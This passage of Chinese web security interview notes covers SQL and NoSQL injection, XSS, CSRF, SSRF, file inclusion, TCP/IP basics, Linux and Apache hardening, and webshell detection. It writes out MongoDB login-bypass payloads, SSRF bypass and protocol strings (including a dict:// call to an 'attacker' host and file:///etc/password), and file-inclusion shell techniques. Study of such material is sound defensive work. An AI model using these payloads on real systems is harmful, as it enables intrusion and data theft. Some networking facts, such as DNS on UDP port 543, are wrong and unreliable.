<li><p>清晰的编程规范，结对/自动化代码 review ，加大量现成的解决方案（PreparedStatement，ActiveRecord，歧义字符过滤， 只可访问存储过程 balabala）已经让 SQL 注入的风险变得非常低了。</p>
</li>
<li><p>具体的语言如何进行防注入，采用什么安全框架</p>
</li>
</ol>
<blockquote>
<p>作者：没啥意思<br>链接：<a href="https://www.zhihu.com/question/22953267/answer/23222069" target="_blank" rel="noopener">https://www.zhihu.com/question/22953267/answer/23222069</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
</blockquote>
<blockquote>
<p>SQL注入问题既不能“靠用户（开发者也是用户）的自觉去避免”，也不能完全脱离用户（开发者也是用户）而指望数据库层面去避免。对于那些不了解SQL注入漏洞细节或不关心SQL注入漏洞或没精力去关心SQL注入漏洞的工程师，你要给他们一条尽可能简单可行透明的方案来避免SQL注入漏洞，告诉他这样写就可以了，这就是安全框架；然后告诉他或者让他的老大告诉他你必须这样写，这就是安全编码规范；然后你有手段在他没有这样写的时候能够检查出来（这比检查出漏洞要容易）并推动他改正，这就是白盒检查。</p>
</blockquote>
<blockquote>
<p>我们现在的互联网产品SQL注入漏洞仍然层出不穷，并不是这套思路有问题，相反恰恰是这套思路没有完善。一方面是框架方案本身不完善，以SQL注入漏洞为例，参数化是防SQL注入框架级方案的重要部分，但仅靠参数化没法很好满足开发过程中一些常见需求，如逗号分割的id列表问题、排序标记的问题等等（其实这些问题真要用参数化的方案解决也可以），使得开发更愿意在这些地方使用非参数化或伪参数化的方法（比如拼接SQL片段后再把整个片段当作参数扔进去exec）。这些问题在参数化的基础上，再加以改进，仍然守着拼接SQL片段时进行强类型转换的思路，仍然是能很好解决的，也就是继续完善参数化方案的问题，而不是看上去那样“参数化解决不了问题”。另一方面，安全编码规范的制定、培训、流程建设和实施保证上也做得远远不到位，开发leader们更希望后面的数据库或者前面的安全防御上能有手段去解决SQL注入问题，对于安全工程师来说，设置并维护几个特征串、语法分析场景也远比做那些安全框架、编码规范、白盒扫描来得要轻松实在，彼此在心照不宣中度过今天，自然不能指望明天能彻底踏实。</p>
</blockquote>
<h3 id="mysql的网站注入，5-0以上和5-0以下有什么区别？"><a href="#mysql的网站注入，5-0以上和5-0以下有什么区别？" class="headerlink" title="mysql的网站注入，5.0以上和5.0以下有什么区别？"></a>mysql的网站注入，5.0以上和5.0以下有什么区别？</h3><p>10年前就出了5.0，现在都到5.7了，没啥意义的问题</p>
<ul>
<li>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</li>
<li>5.0以下是多用户单操作，5.0以上是多用户多操做。</li>
</ul>
<h3 id="SQL和NoSQL的区别"><a href="#SQL和NoSQL的区别" class="headerlink" title="SQL和NoSQL的区别"></a>SQL和NoSQL的区别</h3><p>SQL关系型数据库，NoSQL(Not only SQL)非关系型数据库</p>
<h4 id="SQL优点"><a href="#SQL优点" class="headerlink" title="SQL优点"></a>SQL优点</h4><p>关系型数据库是指用关系数学模型来表示的数据，其中是以二维表的形式描述数据。</p>
<ol>
<li>结构稳定，不易修改，常用联表查询</li>
<li>查询能力高，可以操作很复杂的查询</li>
<li>一致性高，处理数据会使用封锁保证数据不被改变</li>
<li>表具有逻辑性，易于理解</li>
</ol>
<h4 id="SQL缺点"><a href="#SQL缺点" class="headerlink" title="SQL缺点"></a>SQL缺点</h4><ol>
<li>不适用高并发读写</li>
<li>不适用海量数据高效读写</li>
<li>层次多，扩展性低</li>
<li>维护一致性开销大</li>
<li>涉及联表查询，复杂，慢</li>
</ol>
<h4 id="NoSQL优点"><a href="#NoSQL优点" class="headerlink" title="NoSQL优点"></a>NoSQL优点</h4><p>采用键值对存储数据</p>
<ol>
<li>由于数据之间没有关系，所以易扩展，也易于查询</li>
<li>数据结构灵活，每个数据都可以有不同的结构</li>
<li>由于降低了一致性的要求，所以查询速度更快</li>
</ol>
<h4 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h4><p>非关系型数据库的产生是因为随着网站的进化，并发性增加，扩展性高，一致性要求降低。这样关系型数据库最重要的一致性维护就显得有点多余，并且消耗着性能。因此有了非关系型数据库，它可以算是关系型数据库的一种弱化的结果，在海量数据存储和查询上更胜一筹。</p>
<p>两种数据库没有好坏之分，只是使用的环境不一样。关系型数据库可以说是更严谨的，可靠性更强的数据库，在对于数据精度要求高的环境，比如说银行系统这样自然是像mysql这样的数据库适合。非关系型数据库胜在处理大数据的速度，但是对于数据的准确度没有那么高，对于操作量大的环境比如当前大部分web2.0的网站更加适用一些。</p>
<h4 id="MongoDB注入方式"><a href="#MongoDB注入方式" class="headerlink" title="MongoDB注入方式"></a>MongoDB注入方式</h4><p>利用正则：找到y开头的name   <code>db.items.find({name: {$regex: &quot;^y&quot;}})</code></p>
<p>一些payload</p>
<ol>
<li><code>?login[$regex]=^&amp;password[$regex]=^</code></li>
<li><code>?login[$not][$type]=1&amp;password[$not][$type]=1</code></li>
</ol>
<h2 id="XSS-CSRF-XXE"><a href="#XSS-CSRF-XXE" class="headerlink" title="XSS CSRF XXE"></a>XSS CSRF XXE</h2><h3 id="CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h3><blockquote>
<p>xss学习 <a href="https://www.secpulse.com/?s=+%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS+" target="_blank" rel="noopener">https://www.secpulse.com/?s=+%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS+</a></p>
</blockquote>
<p>XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。 </p>
<p>CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer.</p>
<p>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p>
<h3 id="CSRF、SSRF和重放攻击有什么区别？"><a href="#CSRF、SSRF和重放攻击有什么区别？" class="headerlink" title="CSRF、SSRF和重放攻击有什么区别？"></a>CSRF、SSRF和重放攻击有什么区别？</h3><ul>
<li>CSRF是跨站请求伪造攻击，由客户端发起 </li>
<li>SSRF是服务器端请求伪造，由服务器发起 </li>
<li>重放攻击是将截获的数据包进行重放，达到身份认证等目的</li>
</ul>
<h3 id="啥是同源策略，跨域有几种方式？"><a href="#啥是同源策略，跨域有几种方式？" class="headerlink" title="啥是同源策略，跨域有几种方式？"></a>啥是同源策略，跨域有几种方式？</h3><blockquote>
<p><a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</a></p>
</blockquote>
<p>浏览器安全的基石是”同源政策”，目的是为了保证用户的信息安全，防止恶意网站窃取数据，避免cookie共享。同源含义是协议、域名、端口相同的两个网页才可以共用cookie。目前如果非同源，有三种行为收到限制：<br>    - Cookie、LocalStorage 和 IndexDB 无法读取。<br>    - DOM 无法获得。<br>    - AJAX 请求不能发送</p>
<h3 id="如何规避同源策略？"><a href="#如何规避同源策略？" class="headerlink" title="如何规避同源策略？"></a>如何规避同源策略？</h3><h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><p>向服务器请求json数据回调，一般请求URL会加上<code>&amp;callback=xx</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">foo(&#123;</span><br><span class="line">  <span class="string">"ip"</span>: <span class="string">"8.8.8.8"</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>由于<code>&lt;script&gt;</code>元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了foo函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用JSON.parse的步骤。</p>
<h5 id="JSONP的劫持"><a href="#JSONP的劫持" class="headerlink" title="JSONP的劫持"></a>JSONP的劫持</h5><blockquote>
<p><a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/" target="_blank" rel="noopener">http://blog.knownsec.com/2015/03/jsonp_security_technic/</a></p>
</blockquote>
<p>防御：</p>
<ol>
<li>验证 JSON 文件调用的来源（ Referer ），但是Referer 过滤（正则）不严谨、空 Referer也不行</li>
<li>随机token</li>
<li><h4 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h4>WebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。</li>
</ol>
<h4 id="CORS-重点"><a href="#CORS-重点" class="headerlink" title="CORS(重点)"></a>CORS(重点)</h4><blockquote>
<p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/04/cors.html</a></p>
</blockquote>
<p>CORS是跨源资源分享（Cross-Origin Resource Sharing）的缩写。它是W3C标准，是跨源AJAX请求的根本解决方法。相比JSONP只能发GET请求，CORS允许任何类型的请求。<br>CORS请求大致和ajax请求，但是在头信息中加上了Origin字段表明请求来自哪个源。如果orgin是许可范围之内的话，服务器返回的响应会多出<code>Acess-Control-Allow-*</code>的字段</p>
<h5 id="与JSONP的比较"><a href="#与JSONP的比较" class="headerlink" title="与JSONP的比较"></a>与JSONP的比较</h5><p>CORS与JSONP的使用目的相同，但是比JSONP更强大。</p>
<p>JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p>
<h3 id="DOM-XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM-XSS？"><a href="#DOM-XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM-XSS？" class="headerlink" title="DOM XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM XSS？"></a>DOM XSS与反射XSS有啥不同，给你10s，如何快速判断一个XSS是否是DOM XSS？</h3><blockquote>
<p><a href="https://www.zhihu.com/question/26628342" target="_blank" rel="noopener">https://www.zhihu.com/question/26628342</a></p>
</blockquote>
<p>存储型XSS：你发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码；</p>
<p>反射型XSS：你发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码；</p>
<p>DOM型XSS：你发送一次带XSS代码的请求，在返回包里压根儿就找不到XSS代码的影子；</p>
<h3 id="CSP策略"><a href="#CSP策略" class="headerlink" title="CSP策略"></a>CSP策略</h3><blockquote>
<p><a href="https://www.zhihu.com/question/21979782" target="_blank" rel="noopener">https://www.zhihu.com/question/21979782</a><br>浏览器内容安全策略，减少xss攻击。</p>
</blockquote>
<h3 id="SSRF漏洞原理是什么？利用时有哪些伪协议？"><a href="#SSRF漏洞原理是什么？利用时有哪些伪协议？" class="headerlink" title="SSRF漏洞原理是什么？利用时有哪些伪协议？"></a>SSRF漏洞原理是什么？利用时有哪些伪协议？</h3><blockquote>
<p>secpulse.com/archives/65832.html</p>
</blockquote>
<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。</p>
<h4 id="ssrf用处"><a href="#ssrf用处" class="headerlink" title="ssrf用处"></a>ssrf用处</h4><ol>
<li>探测内网信息,用协议探<code>ftp%26ip={ip}%26port={port}</code></li>
<li>攻击内网或本地其他服务</li>
<li>穿透防火墙</li>
</ol>
<h4 id="漏洞处"><a href="#漏洞处" class="headerlink" title="漏洞处"></a>漏洞处</h4><ol>
<li>能够对外发起网络请求的地方</li>
<li>请求远程服务器资源的地方</li>
<li>数据库内置功能</li>
<li>邮件系统</li>
<li>文件处理</li>
<li>在线处理工具</li>
</ol>
<p>举几个例子：</p>
<ol>
<li>在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。</li>
<li>根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。</li>
<li>数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。</li>
<li>邮件系统就是接收邮件服务器地址这些地方。</li>
<li>文件就找ImageMagick，xml这些。</li>
<li>从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。</li>
</ol>
<h4 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h4><ol>
<li><code>http://example.com@127.0.0.1</code></li>
<li>利用IP地址的省略写法绕过,[::]绕过localhost</li>
<li>DNS解析 <a href="http://127.0.0.1.xip.io/" target="_blank" rel="noopener">http://127.0.0.1.xip.io/</a>  可以指向任意ip的域名：xip.io</li>
<li>利用八进制IP地址绕过,利用十六进制IP地址,绕过利用十进制的IP地址绕过</li>
</ol>
<h4 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h4><blockquote>
<p><a href="https://www.secpulse.com/archives/70471.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/70471.html</a></p>
</blockquote>
<p>接受ua为curl的时候，支持的协议有<br><img src="https://www.secpulse.com/wp-content/uploads/2018/04/15235056451.png" alt></p>
<p>使用<code>curl -v http://xx.com/ssrf.php?url=sxxx</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file://</span><br><span class="line">ssrf.php?url=file:///etc/password</span><br><span class="line">Dict://</span><br><span class="line">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</span><br><span class="line">ssrf.php?url=dict://attacker:11111/</span><br><span class="line">SFTP://</span><br><span class="line">ssrf.php?url=sftp://example.com:11111/</span><br><span class="line">TFTP://</span><br><span class="line">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</span><br><span class="line">LDAP://</span><br><span class="line">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</span><br><span class="line">Gopher://</span><br></pre></td></tr></table></figure>

<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><blockquote>
<p><a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html</a></p>
</blockquote>
<ol>
<li><p>检查是否为内网IP地址<br>绕过方法:<br> 利用八进制IP地址绕过<br> 利用十六进制IP地址绕过<br> 利用十进制的IP地址绕过<br> 利用IP地址的省略写法绕过<br>最好的做法：IP地址转换为整数再进行判断</p>
</li>
<li><p>获取真正请求的host</p>
<ol>
<li><p>如何正确的获取用户输入的URL的Host？<br>最常见的就是，使用<a href="http://233.233.233.233@10.0.0.1:8080/、http://10.0.0.1#233.233.233.233这样的URL，让后端认为其Host是233.233.233.233，实际上请求的却是10.0.0.1。这种方法利用的是程序员对URL解析的错误，有很多程序员甚至会用正则去解析URL。使用urllib.parse可以解析真正的hostname" target="_blank" rel="noopener">http://233.233.233.233@10.0.0.1:8080/、http://10.0.0.1#233.233.233.233这样的URL，让后端认为其Host是233.233.233.233，实际上请求的却是10.0.0.1。这种方法利用的是程序员对URL解析的错误，有很多程序员甚至会用正则去解析URL。使用urllib.parse可以解析真正的hostname</a></p>
</li>
<li><p>只要Host只要不是内网IP即可吗？<br>host可能为ip,可能为域名，利用xip.io绕过。方法：判断是否为http协议，获取url的host，再解析该host，将解析到的ip再进行检查</p>
</li>
<li><p>只要Host指向的IP不是内网IP即可吗？<br>不一定，可能会30x跳转</p>
</li>
</ol>
</li>
</ol>
<p>归纳<br>解析目标URL，获取其Host<br>解析Host，获取Host指向的IP地址<br>检查IP地址是否为内网IP<br>请求URL<br>如果有跳转，拿出跳转URL，执行1</p>
<h3 id="在浏览器端，Referer可以篡改吗？"><a href="#在浏览器端，Referer可以篡改吗？" class="headerlink" title="在浏览器端，Referer可以篡改吗？"></a>在浏览器端，Referer可以篡改吗？</h3><p>通过插件修改，一般抓包修改</p>
<h3 id="xss盲打到内网服务器的利用"><a href="#xss盲打到内网服务器的利用" class="headerlink" title="xss盲打到内网服务器的利用"></a>xss盲打到内网服务器的利用</h3><h3 id="xss代码层防御"><a href="#xss代码层防御" class="headerlink" title="xss代码层防御"></a>xss代码层防御</h3><h2 id="文件上传下载遍历漏洞"><a href="#文件上传下载遍历漏洞" class="headerlink" title="文件上传下载遍历漏洞"></a>文件上传下载遍历漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol>
<li>容器漏洞，解析漏洞</li>
</ol>
<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><blockquote>
<p><a href="https://blog.csdn.net/fuckcat_2333/article/details/52132559" target="_blank" rel="noopener">https://blog.csdn.net/fuckcat_2333/article/details/52132559</a></p>
</blockquote>
<h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ol>
<li>本地文件包含</li>
<li>远程文件包含 ：即加载远程文件，在<code>php.ini</code>中开启<code>allow_url_include</code>、<code>allow_url_fopen</code>选项。开启后可以直接执行任意代码。</li>
</ol>
<h3 id="PHP文件包含函数"><a href="#PHP文件包含函数" class="headerlink" title="PHP文件包含函数"></a>PHP文件包含函数</h3><ol>
<li><p><code>include()</code> ：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</p>
</li>
<li><p><code>inclue_once()</code> ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p>
</li>
<li><p><code>require()</code>：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</p>
</li>
<li><p><code>require_once()</code> ：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p>
</li>
</ol>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><ol>
<li>读取敏感文件</li>
<li>远程包含shell</li>
<li>图片上传并包含图片shenll</li>
<li>使用伪协议</li>
<li>包含日志文件GetShell</li>
<li>截断包含</li>
</ol>
<h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3><ol>
<li>禁止远程文件包含 <code>allow_url_include=off</code></li>
<li>配置 <code>open_basedir=指定目录</code>，限制访问区域。</li>
<li>过滤<code>../</code>等特殊符号</li>
<li>修改Apache日志文件的存放地址</li>
<li>开启魔术引号 <code>magic_quotes_qpc=on</code></li>
<li>尽量不要使用动态变量调用文件，直接写要包含的文件。</li>
</ol>
<h2 id="web框架漏洞弱点"><a href="#web框架漏洞弱点" class="headerlink" title="web框架漏洞弱点"></a>web框架漏洞弱点</h2><h3 id="服务端注入之Flask框架中服务端模板注入问题"><a href="#服务端注入之Flask框架中服务端模板注入问题" class="headerlink" title="服务端注入之Flask框架中服务端模板注入问题"></a>服务端注入之Flask框架中服务端模板注入问题</h3><blockquote>
<p><a href="http://www.freebuf.com/articles/web/135953.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/135953.html</a></p>
</blockquote>
<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="TCP三次握手四次挥手"><a href="#TCP三次握手四次挥手" class="headerlink" title="TCP三次握手四次挥手"></a>TCP三次握手四次挥手</h3><h4 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h4><ol>
<li>客户端 syn 发送到服务端，变成 SYN_SENT 状态</li>
<li>服务端 ack=syn+1 回传syn到客户端，变成SYN_RECV状态</li>
<li>客户端 ack=syn+1， 变成ESTABLISHED状态，传输给服务端</li>
<li>服务端收到ACK后变成ESTABLISHED状态，建立连接</li>
</ol>
<p>SYN标志位为表示请求连接，ACK表示确认</p>
<h4 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h4><p>客户端=主动关闭方</p>
<ol>
<li>客户端FIN-&gt;服务端</li>
<li>服务端ACK=FIN+1-&gt;客户端，服务端到客户端的连接关闭</li>
<li>服务端FIN-&gt;客户端</li>
<li>客户端ACK=FIN+1-&gt;服务端</li>
</ol>
<p>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说”我Client端没有数据要发给你了”，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，”告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，”告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，”就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，”就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p>
<blockquote>
<p>MSL=最大段寿命=TTL=最大生存时间=255s</p>
</blockquote>
<h3 id="四层模型"><a href="#四层模型" class="headerlink" title="四层模型"></a>四层模型</h3><ol>
<li>应用层<br>应用层对应于OSI参考模型的高层，为用户提供所需要的各种服务，例如：FTP、Telnet、DNS、SMTP等.</li>
<li>传输层<br>传输层对应于OSI参考模型的传输层，为应用层实体提供端到端的通信功能，保证了数据包的顺序传送及数据的完整性。该层定义了两个主要的协议：传输控制协议（TCP）和用户数据报协议（UDP).<br>TCP协议提供的是一种可靠的、通过“三次握手”来连接的数据传输服务；而UDP协议提供的则是不保证可靠的（并不是不可靠）、无连接的数据传输服务.</li>
<li>网际互联层<br>网际互联层对应于OSI参考模型的网络层，主要解决主机到主机的通信问题。它所包含的协议设计数据包在整个网络上的逻辑传输。注重重新赋予主机一个IP地址来完成对主机的寻址，它还负责数据包在多种网络中的路由。该层有三个主要协议：网际协议（IP）、互联网组管理协议（IGMP）和互联网控制报文协议（ICMP）。<br>IP协议是网际互联层最重要的协议，它提供的是一个可靠、无连接的数据报传递服务。</li>
<li>网络接入层（即主机-网络层）<br>网络接入层与OSI参考模型中的物理层和数据链路层相对应。它负责监视数据在主机和网络之间的交换。事实上，TCP/IP本身并未定义该层的协议，而由参与互连的各网络使用自己的物理层和数据链路层协议，然后与TCP/IP的网络接入层进行连接。地址解析协议（ARP）工作在此层，即OSI参考模型的数据链路层。</li>
</ol>
<h3 id="当你输入一个网址，点击访问，会发生什么？"><a href="#当你输入一个网址，点击访问，会发生什么？" class="headerlink" title="当你输入一个网址，点击访问，会发生什么？"></a>当你输入一个网址，点击访问，会发生什么？</h3><h4 id="查找DNS记录"><a href="#查找DNS记录" class="headerlink" title="查找DNS记录"></a>查找DNS记录</h4><ol>
<li>查看浏览器缓存</li>
<li>查看系统缓存</li>
<li>查看路由器缓存</li>
<li>查找ISP DNS缓存</li>
<li>递归搜索。根据网址，发送一个DNS请求，UDP请求，端口为543，会请求一个DNS服务器，DNS服务器会不断递归查找这个网址的IP</li>
</ol>
<h4 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h4><ol start="2">
<li>跟获取到的IP建立TCP连接，在TCP连接上发送HTTP报文</li>
<li></li>
</ol>
<h3 id="常见的状态码"><a href="#常见的状态码" class="headerlink" title="常见的状态码"></a>常见的状态码</h3><h3 id="OSI七层"><a href="#OSI七层" class="headerlink" title="OSI七层"></a>OSI七层</h3><p>物理层、数据链路层、网络层、传输层(TCP，UDP)、会话层(RPC，SQL)、表示层(定义数据格式及加密)、应用层(TELNET，HTTP，FTP)</p>
<h4 id="OSI四层"><a href="#OSI四层" class="headerlink" title="OSI四层"></a>OSI四层</h4><h2 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h2><h3 id="你搭建过的最复杂的网络设备是什么"><a href="#你搭建过的最复杂的网络设备是什么" class="headerlink" title="你搭建过的最复杂的网络设备是什么"></a>你搭建过的最复杂的网络设备是什么</h3><h3 id="使用过什么硬件设备"><a href="#使用过什么硬件设备" class="headerlink" title="使用过什么硬件设备"></a>使用过什么硬件设备</h3><h2 id="Linux运维"><a href="#Linux运维" class="headerlink" title="Linux运维"></a>Linux运维</h2><h3 id="启动过程"><a href="#启动过程" class="headerlink" title="启动过程"></a>启动过程</h3><h3 id="Linux基线规范"><a href="#Linux基线规范" class="headerlink" title="Linux基线规范"></a>Linux基线规范</h3><p>每个公司有每个公司的基线规范体系，但是答题分为下列五个方面</p>
<h4 id="账号管理和授权"><a href="#账号管理和授权" class="headerlink" title="账号管理和授权"></a>账号管理和授权</h4><ul>
<li>检查特殊账号，是否存在空密码的账户和root权限账户</li>
<li>禁用或删除无用账号</li>
<li>添加口令策略:<code>/etc/login.defs</code>修改配置文件，设置过期时间、连续认证失败次数</li>
<li>禁止root远程登录，限制root用户直接登录。</li>
<li>检查su权限。<code>vi /etc/pam.d/su</code>添加<code>auth required pam_wheel.so group=test</code></li>
</ul>
<h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><ul>
<li>关闭不必要的服务</li>
<li>SSH服务安全<ul>
<li>不允许root账号直接登录系统，<code>PermitRootLogin=no</code></li>
<li>修改SSH使用的协议版本为2</li>
<li>修改允许密码错误次数（默认6次），<code>MaxAuthTries=3</code></li>
</ul>
</li>
</ul>
<h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><ul>
<li>设置umask值 <code>vi /etc/profile</code> 添加行 <code>umask 027</code></li>
<li>设置登录超时 <code>vi /etc/profile</code> 修改配置文件，将以 <code>TMOUT=</code> 开头的行注释，设置为 <code>TMOUT=180</code></li>
</ul>
<h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><ul>
<li>启用syslogd日志，配置日志目录权限，或者设置日志服务器</li>
<li>记录所有用户的登录和操作日志，通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查。<a href="https://www.alibabacloud.com/help/zh/faq-detail/49809.htm" target="_blank" rel="noopener">https://www.alibabacloud.com/help/zh/faq-detail/49809.htm</a></li>
</ul>
<h4 id="IP协议安全要求"><a href="#IP协议安全要求" class="headerlink" title="IP协议安全要求"></a>IP协议安全要求</h4><ul>
<li>远程登录取消telnet采用ssh</li>
<li>设置/etc/hosts.allow和deny</li>
<li>禁止ICMP重定向</li>
<li>禁止源路由转发</li>
<li>防ssh破解，iptables(对已经建立的所有链接都放行，限制每分钟连接ssh的次数)+denyhost(添加ip拒绝访问)</li>
</ul>
<h3 id="中间件基线规范（APACHE）"><a href="#中间件基线规范（APACHE）" class="headerlink" title="中间件基线规范（APACHE）"></a>中间件基线规范（APACHE）</h3><blockquote>
<p><a href="https://www.alibabacloud.com/help/zh/faq-detail/52981.htm" target="_blank" rel="noopener">https://www.alibabacloud.com/help/zh/faq-detail/52981.htm</a></p>
</blockquote>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><ul>
<li>账号</li>
<li>授权</li>
<li>日志</li>
<li>session过期时间（防ddos</li>
<li>绑定监听地址</li>
</ul>
<h4 id="禁止"><a href="#禁止" class="headerlink" title="禁止"></a>禁止</h4><ul>
<li>目录权限</li>
<li>访问外部文件</li>
<li>CGI</li>
<li>非法HTTP方法（PUT DELETE）</li>
</ul>
<h4 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h4><ul>
<li>服务版本号</li>
<li>重定向错误页面</li>
</ul>
<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><ul>
<li>配置文件</li>
<li>默认安装的无用文件</li>
</ul>
<h3 id="webshell检测思路"><a href="#webshell检测思路" class="headerlink" title="webshell检测思路"></a>webshell检测思路</h3><blockquote>
<p><a href="https://blog.csdn.net/u011066706/article/details/51175971" target="_blank" rel="noopener">https://blog.csdn.net/u011066706/article/details/51175971</a></p>
</blockquote>
<p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。</p>
<p>黑客通过浏览器以HTTP协议访问Web Server上的一个CGI文件，是一个合法的TCP连接，TCP/IP的应用层之下没有任何特征，只能在应用层进行检测。黑客入侵服务器，使用webshell，不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是静态特征检测；webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是动态特征检测。</p>
<h4 id="静态检测"><a href="#静态检测" class="headerlink" title="静态检测"></a>静态检测</h4><p>静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell，并且误报率漏报率会比较高，但是如果规则完善，可以减低误报率，但是漏报率必定会有所提高。</p>
<p>优点是快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。缺点漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。</p>
<p>静态检测配合人工</p>
<p>一个检查工具 <a href="https://github.com/he1m4n6a/findWebshell" target="_blank" rel="noopener">https://github.com/he1m4n6a/findWebshell</a></p>
